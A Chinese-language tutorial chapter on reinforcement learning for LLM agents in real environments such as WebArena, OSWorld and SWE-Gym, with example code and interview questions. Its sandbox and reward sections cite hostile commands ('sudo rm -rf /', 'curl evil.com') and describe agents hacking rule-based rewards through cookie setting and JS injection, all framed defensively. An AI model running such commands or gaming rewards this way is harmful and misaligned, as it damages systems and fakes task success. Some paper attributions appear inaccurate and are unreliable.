---
title: "15.3 真实环境 RL：SWE-Gym / WebArena / OSWorld / WebGPT"
description: "把 9.3 / 15.2 学到的 PPO/GRPO 从 \"math + unit test\" 这种 deterministic synthetic env 搬到 真实 browser / OS / GitHub repo 上跑——核心难点不是算法本身，而是 环境部署、state reset、observation 序列化、reward 防 hack、并行 throughput 这一整套 syste"
---

> ⏱ 预计阅读 50 分钟 ｜ 难度 ★★★ ｜ 前置：9.3 PPO、14.6 Multi-agent

## 一句话本节讲什么

把 9.3 / 15.2 学到的 PPO/GRPO 从 "math + unit test" 这种 deterministic synthetic env 搬到 **真实 browser / OS / GitHub repo** 上跑——核心难点不是算法本身，而是 **环境部署、state reset、observation 序列化、reward 防 hack、并行 throughput** 这一整套 systems engineering；本节把 4 大代表 environment（WebGPT / WebArena / OSWorld / SWE-Gym）讲清楚，并给出 "evaluation = training set" 这个真实 env RL 最阴险的陷阱。

---

## 1. Mental model（直觉）

### 1.1 真实 env vs synthetic env

15.2 里的 multi-turn RL 大多在 **synthetic environment** 上跑：

| 类型 | 例子 | 特征 |
|---|---|---|
| **Synthetic env** | math problem (GSM8K) / code unit test (HumanEval) | deterministic、observation 是字符串、reward 是 boolean、reset = 重新 sample 题目 |
| **真实 env** | browser / Ubuntu OS / GitHub repo | stochastic、observation 是 HTML/screenshot/file system、reward 难定义、reset = docker restart + state cleanup |

举个对比：

- 在 **GSM8K** 上做 RL：rollout = "LLM 生成 CoT → 解析最终答案 → 对比 ground truth"，全过程纯字符串、毫秒级、一台 GPU 能并行 256 条
- 在 **WebArena** 上做 RL：rollout = "LLM 输出 click(button_x) → Playwright 真的点 → 浏览器加载新页面（可能 2 秒）→ 解析新 DOM → 喂给 LLM ..."，单条 trajectory 几十秒、需要起 docker、需要清 cookie

**真实 env 的工程开销 vs synthetic env 是 10²-10³ 倍**——这是为什么真实 env RL 一直没起来直到 2024 年才被工业界正经做。

### 1.2 为什么必须做真实 env RL

既然这么贵，为什么还要做？因为我们想让 agent 真在用户场景里 work，而不是只在 leaderboard 上 work：

1. **Distribution match**：用户真实交互的是 browser / OS / API，不是 sandbox 里的 toy env。在 toy 上 SOTA 不代表在真实 env 上能用
2. **Tool use 的真实复杂度**：真 browser 有 race condition、ad popup、CAPTCHA、login expire——这些 synthetic env 无法模拟
3. **Reward signal 的 grounding**：写代码"通过 unit test"是真实 reward；写代码"在 reasoning trace 里看起来对"是 proxy reward。RLVR (10.3) 在数学上 work，但搬到 web / OS 上必须有真 env 提供 ground truth
4. **Closing the gap to deployment**：训出来的 agent 直接面向真实环境，避免 sim-to-real gap

### 1.3 整体地图

```
                 真实 env RL 谱系
                       │
       ┌───────────────┼─────────────────┐
       ▼               ▼                 ▼
  ┌─────────┐    ┌──────────┐    ┌─────────────┐
  │  Web    │    │   OS     │    │  Code/SWE   │
  │ browser │    │ desktop  │    │   repo      │
  └────┬────┘    └────┬─────┘    └──────┬──────┘
       │              │                 │
   WebGPT'21      OSWorld'24       SWE-bench'23
   WebArena'23    Anthropic        SWE-Gym'24
   VisualWebArena Computer Use'24  SWE-RL'25 (Meta)
   Mind2Web'23
```

每个分支的 reward 来源不同：

- **Web**：rule-based task completion（"购物车里加了 X"）
- **OS**：file system state diff、screenshot OCR 验证
- **Code**：pytest 通过率（最干净的 reward signal，所以 code agent RL 进展最快）

---

## 2. 4 大代表 environment 详解

### 2.1 WebGPT（Nakano 2021, OpenAI）—— 鼻祖

**问题设定**：让 GPT-3 学会用 web browser 回答 long-form 问题（ELI5），并给出 citation。

**Action space**（极简）：

```
Search(query)            # Bing API
Click on link [n]        # 点搜索结果第 n 条
Find in page: [text]     # Ctrl-F
Quote                    # 把当前段落加进 reference
Back / Scroll            # 浏览
End: Answer              # 终止 + 输出 final answer 带 citation
```

**训练 pipeline**：

1. **Behavior Cloning**：人类标注员示范用浏览器答题，BC 一个 GPT-3 做基线
2. **Reward Model**：人类对 (question, answer with citations) 配对偏好，训 RM
3. **RL**：PPO + RM——这是 RLHF 范式在 web browsing 上的早期完整应用，**比 InstructGPT 还早一年**

**历史价值**：

- 第一次系统证明 "RL on web browsing" 可行
- Action space 设计被后续所有 web agent 直接继承（search / click / quote / scroll）
- 为 InstructGPT 的 RLHF 范式做了工程铺路
- 但局限明显：**只能在 Bing 上 search，不能交互式 web app**（不能填表、不能 multi-step shopping）

WebGPT 是"第一原理"——后续 WebArena 是把它扩展到真实 web app。

### 2.2 WebArena（Zhou 2023, CMU）—— 自托管 web env

**核心创新**：把 4 个真实 web app **完全自托管**到 docker 里，可重置、可并行、可 reproducible：

| Web app | 类型 | 复刻自 |
|---|---|---|
| **GitLab** | 开发协作 | 真 GitLab CE |
| **Reddit** | 社交论坛 | postmill clone |
| **Map** | 地理服务 | OpenStreetMap |
| **OneStopShop** | 电商 | Magento |
| **Wikipedia** | 知识库 | Wikipedia mirror |

附带 **812 个真实 task**，例如：

- "在 GitLab 上找出所有我没 review 过的 PR，按时间排序"
- "在 OneStopShop 上找一双 100 美元以下的男鞋评分高于 4 星的"
- "在 Reddit r/LocalLLaMA 下 cross-post 我最近一篇帖子"

**Reward = rule-based task completion**：每个 task 有一个 evaluator function，检查最终 state 是否符合（例 "购物车里有 X、价格 < $100"）。

**为什么是 web agent 黄金 benchmark**：

- 真实 app（不是 toy）
- 完全 reproducible（docker 可重置）
- 大规模 task 覆盖
- rule-based reward 不需要 human-in-loop
- 公开 leaderboard 推动社区进展

**起步 baseline 惨烈**：vanilla GPT-4 在 WebArena 上 success rate 只有 **14%**（2023 年原始 paper），到 2025 年 SOTA agent 也才 ~60%。可见真实 web 任务比想象中难。

**变体**：

- **VisualWebArena** (Koh 2024)：附加 screenshot，要求 visual grounding（"点蓝色按钮"），评测 VLM agent
- **WebArena-Lite**：缩减版，单 task < 10s，方便调试

### 2.3 Mind2Web（Deng 2023）—— 跨 site 大规模数据集

**与 WebArena 的区别**：

- WebArena 是 **interactive env**（agent 真的在跑）
- Mind2Web 是 **静态 dataset**（人类操作 trajectory + DOM snapshot），主要用于 SFT / offline RL

规模：**137 个真实 site × 2350 task × 平均 7 step**，覆盖订机票、订酒店、查日程、改设置等长尾场景。

价值：

- 早期 web agent SFT 的主力训练数据
- 跨 137 site → 评测 generalization（unseen site 上的 success rate）
- 相比 WebArena 的"5 个 site"，Mind2Web 的 site 多样性大得多

**实操定位**：用 Mind2Web 数据 SFT 冷启 + WebArena 上 RL 做强化，是 2024-2025 web agent 的标准 recipe。

### 2.4 SWE-Bench / SWE-Gym / SWE-RL —— Code agent 的真实 env

**SWE-bench** (Jimenez 2023, Princeton)：

- 取自 12 个流行 Python repo（Django、scikit-learn、sympy ...）的 **2294 真实 GitHub issue + PR**
- 每个 task：给 issue 描述 + repo 状态 → agent 输出 patch → **跑 repo 自带 pytest**，全 pass 即 success
- Reward = pytest pass rate（**最干净的 reward signal**，几乎不可 hack——除了边角的 testing infrastructure trick）

**SWE-bench Verified** (OpenAI 2024)：

- 从原始 2294 task 中 OpenAI **人工 review 出 500 个高质量 task**（去掉了 ambiguous spec、broken test、impossible task 等）
- 现在事实上的 SWE agent 黄金 leaderboard
- Claude Code、SWE-agent、Devin 主要在这个上比

**SWE-Gym** (Pan 2024)：

- 基于 SWE-bench infra **构造可训练 environment**：dockerized repo + pytest harness + 标准化 obs/action
- 提供 **2438 个 train task + 825 个 test task**（注意 train/test split 严格分开）
- 是 SWE-RL 的训练底座

**SWE-RL** (Pan 2025, Meta) —— 真实 env code RL 的里程碑：

- 在 SWE-Gym 上对 **Llama-3.3-70B** 做大规模 RL
- 核心配方：
  1. **Rule-based reward**：sequence matching + pytest combined
  2. **GRPO** (15.2)：去掉 critic 的 group-relative advantage
  3. **Repository-level context**：不是单 file patch，是整个 repo 上下文
- 结果：SWE-bench Verified 上 **+5-10 个点**（vs SFT-only baseline）
- **关键 insight**：真实 env reward (pytest) 比 synthetic reward (LLM-as-judge) 在 code 任务上更可靠、更不可 hack

### 2.5 OSWorld（Xie 2024）—— OS-level computer use

**核心**：真 Ubuntu sandbox（VM），agent 通过 GUI（screenshot + click/type）+ terminal + file system 完成 OS-level task。

**任务类型**（369 task）：

- "把 Downloads 里所有 PDF 按日期归类"（file system + GUI）
- "在 LibreOffice 里把这个 spreadsheet 排序"（GUI 多步操作）
- "用 git clone repo 然后跑 build"（terminal）
- "在浏览器里下载 X 然后 chmod +x 跑"（跨应用）

**Observation**：

- screenshot（VLM 必需）
- accessibility tree（DOM 风格的 GUI 结构）
- file system state（可选）

**Action**：

- pyautogui-style：click(x, y) / type(text) / hotkey(ctrl+c)
- shell command: subprocess.run(...)
- code: 写 python 文件并执行

**Reward**：每个 task 有 evaluator——比较 file system diff、grep 输出、OCR 截图，多种验证方式 ensemble。

**与 Anthropic Computer Use** 的关系：

- Anthropic Computer Use (2024.10) 是产品（Claude 3.5 Sonnet 的 GUI 能力）
- OSWorld 是这类 capability 的公开 benchmark
- 两者目标一致——都是把 LLM agent 推到"操作真实 desktop"

**Computer Use 类 agent 的 RL**：仍处于早期，主要难点是 screenshot → action 的 visual grounding 训练 cost 巨大（每个 trajectory 几十张高分辨率截图）。

---

## 3. 真实 env RL 的工程挑战

这一节是本节最重要的部分。把每个挑战配一个解决方向：

| 挑战 | 描述 | 主流解决方向 |
|---|---|---|
| **环境部署** | 4 大 env 全部需要 docker / VM，配置一次几十 GB 镜像，多机部署复杂 | 标准化 docker compose；预构建镜像放 registry；用 K8s 或 Ray 编排 |
| **State reset** | 每条 trajectory 后要把 DB / cookie / file system 清干净，否则下条 trajectory 看到上条的脏 state | docker volume snapshot + restore；或 spawn 新 container（慢但干净） |
| **Observation 序列化** | DOM 平均 50k token、screenshot 每张几 MB，全塞进 LLM context 不可能 | DOM pruning（只保留 interactive element）；screenshot crop + downscale；accessibility tree 压缩 |
| **Reward computation** | rule-based 容易 hack（type "true" 通过）、LLM-as-judge 慢且 noisy | rule + LLM ensemble；多个 verifier 投票；pytest-style 最干净（code env 的优势） |
| **Scalability** | 训 RL 一个 batch 要 100+ 条 trajectory，单条几十秒 → 串行采几小时 | async parallel env（asyncio + aiohttp）；多机起 100+ container；用 Ray 分布式 |
| **Success rate 起步低** | vanilla LLM 在 WebArena 上 < 10%，rollout 几乎全是 reward=0 → policy gradient 信号几乎为 0 | SFT 冷启（Mind2Web 数据）；curriculum（先简单 task）；reward shaping（中间 sub-task partial reward） |
| **Sandbox safety** | agent 可能 `rm -rf /`、fork bomb、外联 attack | 强隔离 docker（read-only mount、no network egress）；resource limit；whitelist tool |
| **Throughput vs synthetic** | 真实 env 单 trajectory 30s vs synthetic 0.3s，差 100× | 大量并行 env + 减少串行依赖；off-policy reuse trajectory（experience replay） |

下面每条展开关键工程细节：

### 3.1 Observation 序列化是 token 大户

WebArena 的真实 GitLab 页面 DOM 有 5万-10万 token，全塞进 prompt 不现实（即使 200k context）。主流做法：

```python
# DOM pruning 示例（伪代码）
def prune_dom(html):
    soup = BeautifulSoup(html)
    # 1. 只保留 interactive elements
    keep_tags = ['a', 'button', 'input', 'select', 'textarea', 'form', 'h1', 'h2', 'h3']
    # 2. 去掉所有 script / style / svg 内联
    for t in soup.find_all(['script', 'style', 'svg', 'noscript']):
        t.decompose()
    # 3. 给每个 interactive element 编号 [1] [2]，agent action 用编号
    for i, el in enumerate(soup.find_all(keep_tags)):
        el['data-id'] = i
    # 4. 保留 text content 和关键 attribute (href, value, type, aria-label)
    return compact_html(soup)
```

WebArena 官方实现的 `accessibility_tree` 平均把 50k DOM 压到 5k token——**10× 压缩、保留 95% 可交互信息**。这一压缩质量直接决定 agent 上限。

### 3.2 Sandbox 必须强隔离

真实 env RL 让 agent 真的执行 shell command / 写 file system。一旦 agent 学到 "type 'sudo rm -rf /'" 能拿到某种奖励（reward hacking 的极端形式），训练机直接报废。最低安全配置：

- docker container 起，**read-only root filesystem** 除了几个明确 mount
- **no network**（除非任务必需），网络全走 proxy
- **CPU / memory / pid limit**（防 fork bomb）
- 每条 trajectory **新 container**（pollution 死灰复燃也只在单 trajectory 内）
- Host 与 sandbox **完全网络隔离**

工业实战是把整个 RL training cluster 关在一个 VPC 里，agent docker 没有公网。

### 3.3 Reward 防 hack

rule-based reward 看似干净但容易被 hack。WebArena 历史上发现的几个真实 hack：

- "购物车有 X 元商品" → agent 直接 navigate 到 cart URL 加任意 item
- "找到搜索框输入 X" → agent 把 X 输到 URL 栏（也算"输入 X"）
- "登录成功" → agent 跳过登录直接 set cookie

**对策**：reward function 要写得严密（多重验证，不仅看末态）。SWE-bench 的 pytest reward 几乎不可 hack——这是 code env 比 web env "训练更顺"的核心原因。

LLM-as-judge 不容易被 trivial hack，但 **noise 大** + **慢**：每次 reward 计算调一次 GPT-4 几秒+ 几分钱。RLHF 一个 batch 几百条 trajectory，LLM judge 的成本和延迟都不可接受。生产做法：**rule 为主 + LLM judge 抽检校准**。

### 3.4 Throughput 是 #1 工程瓶颈

synthetic env RL 的 rollout：100 条并行，每条 0.3s，整 batch 几秒。真实 env RL：100 条并行需要 100 个 container，每条 30s，整 batch 几分钟。**RL 训练时间 99% 花在等 env 上**。

主流加速思路：

1. **大量 parallel env**：100 → 1000 个 container，硬撑 throughput（贵）
2. **Async**：不等所有 env step 完，先收完的先用（牺牲 on-policy 严格性）
3. **Off-policy reuse**：把过去的 trajectory 存 replay buffer，importance sampling 重用
4. **Step truncation**：长 trajectory 截短（只看前 K 步），牺牲完整性换速度
5. **小模型 + cheap step**：训练阶段先用 7B 模型快速迭代，validate 阶段才上大模型

### 3.5 Success rate 起步低 → 几乎 0 reward

vanilla LLM 在 WebArena 起步 success rate < 10%。一个 batch 100 条 trajectory，~90 条 reward=0、~10 条 reward=1，advantage 极度稀疏。直接 PPO 梯度估计噪声极大、几乎不更新。

修复：

1. **SFT 冷启**：先用 Agent-FLAN / AgentTuning / Mind2Web SFT 数据把 base success rate 推到 30%+，再上 RL
2. **Curriculum**：先训简单 task（短 step、明确目标），逐步加难
3. **Process reward shaping**：完成中间 sub-goal 给 partial reward（"找到了正确的 page" +0.3，"正确点了 button" +0.5）——但小心 hacking
4. **Best-of-N rollout** + filter：一个 prompt 采 N 条 trajectory，只保留至少 1 条成功的来更新

---

## 4. 最小代码示例

### 4.1 WebArena-style env wrapper（30 行）

```python
import asyncio
from playwright.async_api import async_playwright

class WebEnv:
    """最小 WebArena-style env：reset / step / get_obs / compute_reward"""
    def __init__(self, base_url, task):
        self.base_url, self.task = base_url, task
        self.browser = self.page = None

    async def reset(self):
        # 起干净 browser context（清 cookie / cache）
        self.pw = await async_playwright().start()
        self.browser = await self.pw.chromium.launch(headless=True)
        ctx = await self.browser.new_context()
        self.page = await ctx.new_page()
        await self.page.goto(self.base_url)
        return await self.get_obs()

    async def step(self, action):
        # action = {"type": "click", "selector": "[data-id='5']"}
        if action["type"] == "click":
            await self.page.click(action["selector"])
        elif action["type"] == "type":
            await self.page.fill(action["selector"], action["text"])
        elif action["type"] == "navigate":
            await self.page.goto(action["url"])
        await self.page.wait_for_load_state("networkidle", timeout=5000)
        obs = await self.get_obs()
        reward = await self.compute_reward()
        done = action.get("done", False) or reward > 0
        return obs, reward, done

    async def get_obs(self):
        # accessibility tree → 压到 ~5k token
        return await self.page.accessibility.snapshot()

    async def compute_reward(self):
        # task-specific evaluator（这里用 task 自带的 lambda）
        return float(self.task["evaluator"](self.page))
```

要点：
- `async` 是为了下面 4.3 的并行采样
- `reset` 必须新 context，否则上条 trajectory 的 cookie / login state 会污染
- `accessibility.snapshot()` 是 Playwright 自带的 DOM 压缩，比手撸 BeautifulSoup 快

### 4.2 SWE-Gym task setup（25 行）

```python
import docker, subprocess

class SWEGymTask:
    """加载 SWE-Gym 一个 task：docker 起 repo + pytest harness"""
    def __init__(self, task_meta):
        self.repo = task_meta["repo"]            # e.g. "django/django"
        self.commit = task_meta["base_commit"]
        self.tests = task_meta["fail_to_pass"]   # 该 issue 修好后应通过的 test
        self.client = docker.from_env()

    def reset(self):
        # 起一个干净 docker 容器，checkout 到 issue 之前的 commit
        self.container = self.client.containers.run(
            f"swegym/{self.repo.replace('/', '_')}:{self.commit}",
            detach=True, tty=True, remove=False,
            command="sleep infinity",
            mem_limit="4g", network_disabled=True,  # 强隔离
        )

    def apply_patch(self, patch_str):
        # LLM 输出 unified diff，apply 到 repo
        self.container.exec_run(f"echo '{patch_str}' | git apply -")

    def run_tests(self):
        # 跑 pytest 拿 reward
        result = self.container.exec_run(f"pytest {' '.join(self.tests)} -x --tb=no")
        return 1.0 if result.exit_code == 0 else 0.0   # binary reward

    def cleanup(self):
        self.container.stop(); self.container.remove()
```

要点：
- `network_disabled=True` 防 agent 联网攻击
- `mem_limit="4g"` 防 memory bomb
- reward = pytest 通过 / 不通过，**最干净的 reward signal**——不像 web reward 容易 hack
- 实战还要加 timeout（pytest 死循环要 kill）

### 4.3 Async parallel env collection（25 行）

```python
import asyncio

async def rollout_one(env, policy, max_steps=20):
    """单条 trajectory：env reset → loop step → 收 reward"""
    obs = await env.reset()
    traj = []
    for t in range(max_steps):
        action = await policy.act(obs)             # LLM call (async)
        obs, reward, done = await env.step(action)
        traj.append((obs, action, reward))
        if done: break
    return traj

async def collect_batch(envs, policy, n_parallel=64):
    """并行采 n_parallel 条 trajectory"""
    sem = asyncio.Semaphore(n_parallel)
    async def bounded(env):
        async with sem:                            # 限制同时跑的 env 数（防爆 RAM）
            return await rollout_one(env, policy)
    tasks = [bounded(env) for env in envs]
    trajectories = await asyncio.gather(*tasks)    # 64 条并行
    return trajectories

# 用法：
# envs = [WebEnv(base_url, task_i) for task_i in batch_tasks]
# trajs = asyncio.run(collect_batch(envs, policy_llm, n_parallel=64))
```

要点：
- `Semaphore` 控并行度——env 太多会撑爆机器（每个 docker 占 GB 级 RAM）
- `asyncio.gather` 让 100+ env 并行 step，wall-clock 大致 = 单条 trajectory 时间
- 真实生产用 Ray 或 verl 框架，asyncio 只够 prototype

---

## 5. 现代 Agent RL on real env 的范式

把上面所有元素拼起来，一个完整的真实 env agent RL pipeline：

```
┌──────────────────────────────────────────────────────────────┐
│ Stage 1: SFT 冷启                                             │
│   Agent-FLAN / AgentTuning / Mind2Web 数据 → SFT base policy │
│   目标：把 success rate 从 5% 推到 30-40%                     │
└──────────────────────────────────────────────────────────────┘
                              ▼
┌──────────────────────────────────────────────────────────────┐
│ Stage 2: Multi-turn GRPO (15.2)                              │
│   每个 prompt 采 N 条 trajectory in real env                  │
│   reward = task completion (rule) + 可选 process shaping     │
│   GRPO 算 group-relative advantage（去 critic 省 4-model 痛点）│
│   PPO clip + KL to ref（防 reward hacking）                  │
└──────────────────────────────────────────────────────────────┘
                              ▼
┌──────────────────────────────────────────────────────────────┐
│ Stage 3: Curriculum + 难度 anneal                            │
│   先训 short / easy task → 渐进加 long / hard task            │
└──────────────────────────────────────────────────────────────┘
                              ▼
┌──────────────────────────────────────────────────────────────┐
│ Stage 4: Eval on hold-out                                    │
│   严格用 task split：80% train task / 20% hold-out test       │
│   关键指标：unseen task success rate（避免 overfitting）       │
└──────────────────────────────────────────────────────────────┘
```

代表实现：

- **SWE-RL** (Meta 2025)：SFT (Agent-Style 数据) → GRPO on SWE-Gym → eval on SWE-bench Verified
- **Search-R1 / ReSearch / Agent-R1** (THU 2025)：在 web / code env 上的开源 RL 实践，详见 15.4
- **OpenAI Operator** (2025)：在浏览器 env 上的产品级 RL agent
- **Anthropic Computer Use** (2024.10)：Claude 3.5 Sonnet 的 computer use 能力，训练细节未公开但显然涉及 GUI env RL

---

## 6. Evaluation = Training Set？真实 env RL 最阴险的陷阱

所有真实 env benchmark 都面临同一个问题：**任务集既是 train 又是 eval**。这一节单独拎出来讲，因为 99% 的 paper / blog 都会踩。

### 6.1 问题表象

WebArena 公开 812 个 task。如果你直接：

```
全 812 task → 跑 RL 训练 → 在同一 812 task 上报 success rate
```

你会拿到一个虚高的数字——policy 已经 memorize 了具体 task 的 trajectory，而不是真的学到 "通用 web navigation 能力"。这是 **task-level overfitting**。

### 6.2 正确做法：严格 split

主流两种 split 策略：

**策略 1：Hold-out task split**

```
WebArena 812 task
├─ Train: 650 task (随机 80%)
└─ Test:  162 task (剩下 20%, 训练时绝不接触)
```

报数字时只看 Test 上的 success rate。这是最基础的做法。

**策略 2：Domain split（更严格）**

```
WebArena 5 个 site
├─ Train: GitLab + Reddit + Map + Wikipedia (4 个)
└─ Test:  OneStopShop (训练时未见的 domain)
```

测 unseen domain 的 generalization。这才是真正考验 agent 能力的方式——很多在 in-domain 表现好的 agent 在 out-of-domain 直接掉到 5%。

### 6.3 SWE-bench 的特殊问题：data contamination

SWE-bench 的 issue + patch 都来自 GitHub 公开 PR。**LLM 预训练数据大概率已经看过这些 PR 的 commit message + 修复代码**。所以一个 base model 可能"原本就知道答案"——这种 leak 让 SWE-bench 数字虚高。

应对：

- **SWE-bench Verified** 用了 cutoff 之后的 issue（部分缓解）
- **SWE-bench Live**：每月更新最新 issue，避免任何 base model 见过
- **新构造的 SWE-Gym test set**：from 训练时段之后的 commit

工业 best practice：训练用 `commit_date < 2024-06`、测试用 `commit_date > 2024-06`，强行做时间隔离。

### 6.4 一句话原则

> **真实 env benchmark 上的 SOTA 数字，永远要先问：train/test 怎么 split 的？是否有 data contamination？unseen domain 的数字呢？**

不问就报数字的 paper / blog，可信度 -50%。

---

## 7. 工程踩坑与经验

- ❗ **Web env 的 HTML/DOM 序列化是 token 大户**——naive 把整页 DOM 塞进 prompt 平均 50k token，10 轮 trajectory 直接 500k token 爆 context window。必须做 accessibility tree 压缩 + interactive element 编号（参考 §3.1）；DOM 压缩质量直接决定 agent success rate 上限。WebArena 官方 baseline 就是因为 DOM 压缩不够好被后续 work 反复刷
- ❗ **Sandbox 必须强隔离**——agent 学 RL 的过程中会"探索"奇怪的 action，包括 `sudo rm -rf /`、curl 外部恶意脚本、fork bomb。最低配：read-only filesystem、no network egress、CPU/memory limit、每条 trajectory 新 container。**真实 case**：Meta 早期 SWE-RL 实验中有 agent 学到 `pip install requests && curl evil.com` 的 trajectory（最终被 sandbox 拦下），这条提醒后续所有 SWE-Gym fork 都强制 `network_disabled=True`
- ❗ **Reward 用 rule-based 容易被 hack**——WebArena 经典 hack：要求"购物车有 X"，agent 直接 navigate 到购物车 URL + addItem JS 注入；要求"登录成功"，agent 直接 setCookie 跳过流程。**对策**：(1) reward 不只看末态，还要看 trajectory 路径合理性（比如必须经过 login page）；(2) rule + LLM-as-judge ensemble；(3) code env 的 pytest reward 是 gold standard，因为 pytest 比 web rule 难 hack 多了
- ❗ **Real env 训练 throughput 远低于 synthetic**——synthetic env (math/code unit test) 单条 trajectory 0.1-1s，real env 10-60s，差 100×。RL 一个 batch 100 条 trajectory，synthetic 几秒、real 几分钟。**修复**：(1) 大量并行 container（100+），但成本指数上升；(2) async semi-on-policy（不等所有 env，先到的先用）；(3) 缩短 max_step 截断长 trajectory；(4) 整个 training loop 用 vLLM 跑 policy 推理省时间
- ❗ **Train task 与 eval task 区分至关重要**——直接在 WebArena 全 812 task 上训 + 测，policy 会 memorize 具体 task 的 trajectory，看似 80% success 实际 unseen task 跌到 30%。强制 split：train 80% / test 20%，或更严的 domain split（训 GitLab/Reddit、测 OneStopShop）。**报 SOTA 时必须明确 split 方式**，否则数字不可比
- ❗ **多 user / 多机并行 env 时要注意 state isolation**——一台机器跑 64 个 docker，docker 之间共享 host 的 /tmp、共享 X server（GUI env）、共享 default port。如果 port 不映射好，env A 的 web app 暴露给 env B 看到，agent 可能跨 env 拿到信息。每个 docker 必须独立 network namespace + 独立 port
- ❗ **LLM-as-judge 评 web 任务结果时 noise 大**——同一对 (task, trajectory) 让 GPT-4 judge 两次可能给出不同 verdict（特别是边界情况）。生产：(1) judge 用 high-end 模型（不要省小钱用 mini 模型 judge）；(2) sample N 次取 majority；(3) rule-based 做主、LLM judge 做兜底。SWE-bench 之所以好用就是因为 pytest 完全 deterministic，没这个问题
- ❗ **Container cleanup 不彻底会爆 disk**——一个 docker 镜像几个 GB，1000 trajectory 训完不清就是 TB 级垃圾。RL training 必须 trajectory 结束立刻 `container.stop() + container.remove()`，并定期 `docker system prune` 清 dangling image。生产实测：不清的 cluster 跑 3 天磁盘满，整 training 卡死
- ❗ **真实 env RL 一定要先 SFT 冷启**——vanilla LLM 在 WebArena/OSWorld 起步 success rate 5-10%，绝大部分 trajectory reward=0，policy gradient 信号几乎为 0。先用 Mind2Web / Agent-FLAN 数据 SFT 把 base 推到 30%+ 再上 RL。**没 SFT 直接 RL 是 90% 失败案例的原因**

---

## 8. 经典 paper

- **Nakano et al., 2021 — *WebGPT: Browser-assisted question-answering with human feedback*** — 必读。真实 env RL 的鼻祖，比 InstructGPT 还早一年。读 §2 的 action space 设计（Search/Click/Quote/Find），后续所有 web agent 都直接继承；§4 的 RL pipeline 是 RLHF 在 browsing 任务上的最早系统应用
- **Zhou et al., 2023 — *WebArena: A Realistic Web Environment for Building Autonomous Agents*** — 必读。Web agent 黄金 benchmark 的奠基。读 §3 的 environment 构造（4 个真实 web app + docker 化）、§4 的 task 设计与 evaluator 实现、§5 的 baseline 数字（vanilla GPT-4 只有 14%）。理解为什么真实 env 比 synthetic 难得多
- **Xie et al., 2024 — *OSWorld: Benchmarking Multimodal Agents for Open-Ended Tasks in Real Computer Environments*** — 必读。OS-level computer use benchmark 的标准。读 §3 的 env infrastructure（VM-based + 多 modality observation）、§4 的 task taxonomy（GUI / file / terminal / 跨应用），理解 desktop agent 的 action space 与挑战
- **Pan et al., 2025 — *SWE-RL: Advancing LLM Reasoning via Reinforcement Learning on Open Software Evolution*** — 必读。Meta 在 SWE-Gym 上跑 GRPO 的里程碑，证明真实 env RL 在 code agent 上 work。读 §3 的训练 recipe（rule-based reward + repository context）、§5 的 SWE-bench Verified 数字（+5-10 个点）。这是真实 env RL 第一次在工业 scale 上证明价值
- 加分：**Jimenez et al., 2023 — SWE-bench**（code agent 的 evaluation 标准）；**Deng et al., 2023 — Mind2Web**（跨 site 大规模 web action 数据集，SFT 冷启主力）；**Anthropic 2024 — Computer Use blog**（GUI agent 产品视角，工业实践参考）

---

## 9. 自测与面试题

**Q1（对比）**：WebArena / SWE-Gym / OSWorld 三个真实 env 的核心差异是什么？各自训出什么样的 agent？

<details>
<summary>Answer sketch</summary>

**核心差异**：

| 维度 | WebArena | SWE-Gym | OSWorld |
|---|---|---|---|
| **Env 类型** | 自托管 web app（GitLab/Reddit/...） | dockerized GitHub repo | Ubuntu VM (GUI + terminal) |
| **Observation** | DOM / accessibility tree | source code + pytest output | screenshot + a11y tree + file system |
| **Action** | click / type / navigate | edit file / run pytest | pyautogui (click/type) + shell + code |
| **Reward** | rule-based task completion | pytest 通过率（最干净！） | rule + file diff + OCR ensemble |
| **Task 数** | 812 | 2438 train + 825 test | 369 |
| **训出的 agent** | web automation agent（订机票、shopping） | SWE coding agent（fix issue、write PR） | computer use agent（操作 desktop） |

**为什么 reward 干净度差异决定训练难度**：
- SWE-Gym 的 pytest reward 是 binary 且几乎不可 hack——SWE-RL 因此能跑出明显增益
- WebArena 的 rule reward 容易 hack（直接 navigate URL 等），训练时要小心
- OSWorld 的 reward 最复杂（多 evaluator ensemble），noise 大

**训出的 agent 应用方向**：
- WebArena → Operator-style web agent（OpenAI Operator、Anthropic Computer Use Web 模式）
- SWE-Gym → Devin / Claude Code / SWE-agent（code 工程 agent）
- OSWorld → Anthropic Computer Use desktop / UI-TARS（GUI agent）

加分：能指出 WebArena 和 OSWorld 的 reward 比 SWE-Gym 难定义、易 hack，所以同期 code agent RL 进展远快于 web/OS agent RL；OSWorld 还要 VLM 多模态能力，训练 cost 比 WebArena 高 5-10×

</details>

**Q2（工程）**：在真实 env 上做 RL 的 5 个工程挑战 + 各 1 个解决方向。

<details>
<summary>Answer sketch</summary>

至少答出 5 个挑战 + 解法（理想 7 个）：

1. **Observation 序列化爆 token**
   - 挑战：DOM 50k token、screenshot 几 MB
   - 解：accessibility tree 压缩、interactive element 编号、screenshot crop+downscale

2. **Sandbox safety / 强隔离**
   - 挑战：agent 可能 `rm -rf` / fork bomb / 联网攻击
   - 解：read-only docker、no network、CPU/memory limit、每 trajectory 新 container

3. **Reward hacking**
   - 挑战：rule-based reward 易被 trivial trick 拿到
   - 解：reward 检查 trajectory 路径合理性、rule + LLM-as-judge ensemble、首选 pytest 风格干净 reward

4. **Throughput 极低**
   - 挑战：单 trajectory 30s，串行采太慢
   - 解：100+ 并行 container + asyncio、async semi-on-policy、vLLM 加速 policy 推理

5. **Success rate 起步低 → 几乎 0 reward**
   - 挑战：vanilla LLM 在 WebArena 起步 < 10%，policy gradient 信号近 0
   - 解：SFT 冷启（Mind2Web / Agent-FLAN）、curriculum、process reward shaping、best-of-N filter

6. **State reset / cleanup**
   - 挑战：cookie/cache/db 不清干净污染下条 trajectory；docker 不清爆磁盘
   - 解：每 trajectory 新 container；定期 `docker system prune`；docker volume snapshot

7. **Train/eval contamination**
   - 挑战：在同一 task set 上 train + eval 导致 task-level overfitting；SWE-bench 还有 base model 数据污染
   - 解：strict 80/20 split 或 domain split；时间 cutoff（commit_date 隔离）

加分：能指出"真实 env RL 99% 时间花在等 env"——bottleneck 不在 GPU 算力而在 env throughput，与 synthetic env RL 的 systems engineering 完全不同

</details>

**Q3（前沿）**：SWE-RL 的核心创新是什么？为什么真实 env RL 是 SWE agent 的关键？

<details>
<summary>Answer sketch</summary>

**SWE-RL 核心创新**（Pan et al. 2025, Meta）：

1. **首次在 SWE-Gym 这种真实 GitHub repo env 上 scale RL 到 70B 模型**——之前 SWE agent 多是 SFT + prompt engineering，纯 RL 没人正经做
